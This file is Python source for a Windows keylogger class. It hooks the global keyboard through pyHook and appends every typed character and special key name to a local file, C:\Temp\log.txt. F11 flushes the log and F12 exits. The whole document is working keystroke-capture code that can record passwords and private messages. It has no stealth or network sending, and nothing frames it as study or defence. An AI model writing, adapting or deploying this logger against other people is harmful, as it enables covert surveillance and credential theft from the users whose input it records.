import pyHook
import time
import pythoncom
import sys

class KeyLogger:
    ''' Captures all keystrokes, and logs them to a text file
    '''
    def __init__(self, hookKeyboard=1, hookMouse=0, exitKey="F12", flushKey="F11", logFile="C:\Temp\log.txt"):
        
        self.exitKey = exitKey                      #key we press to quit keylogger
        self.flushKey = flushKey                    #key we press to make keylogger flush the file buffer (so we can check the log, for example)
        
        self.hm = pyHook.HookManager()
    
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if hookKeyboard == 1:
            self.hm.HookKeyboard()
        if hookMouse == 1:
            self.hm.HookMouse()
            
        self.log = open(logFile, 'a')            
        
        #ascii subset is created as a filter to exclude funky non-printable chars from the log
        self.asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
        self.asciiSubset.extend(range(32,128))      #all normal printable chars
        
        pythoncom.PumpMessages()
            

    def OnKeyboardEvent(self, event):
        '''This function actually writes the stuff to the log, subject to parsing.
        '''
        '''
        self.log.write('MessageName: ' + str(event.MessageName))
        self.log.write('Message: ' + str(event.Message))
        self.log.write('Time: ' + str(event.Time))
        self.log.write('Window: ' + str(event.Window))
        self.log.write('WindowName: ' + str(event.WindowName))
        self.log.write('Ascii: ' + str(event.Ascii) + ' ' + chr(event.Ascii))
        self.log.write('Key: ' + str(event.Key))
        self.log.write('KeyID: ' + str(event.KeyID))
        self.log.write('ScanCode: ' + str(event.ScanCode))
        self.log.write('Extended: ' + str(event.Extended))
        self.log.write('Injected: ' + str(event.Injected))
        self.log.write('Alt: ' + str(event.Alt))
        self.log.write('Transition: ' + str(event.Transition))
        self.log.write('---\n')
        '''
        if event.Ascii in self.asciiSubset:
            self.log.write(chr(event.Ascii))
            
        #we translate all the special keys, such as arrows, backspace, into text strings for logging
        #exclude shift keys, because they are already represented (as capital letters/symbols)
        if event.Ascii == 0 and not (str(event.Key).endswith('shift')):
            self.log.write('[KeyName:' + event.Key + ']')
        
        if event.Key == self.flushKey:
            self.log.flush()
        
        if event.Key == self.exitKey:
            sys.exit()
            
        return True

if __name__ == '__main__':
    kl = KeyLogger()
    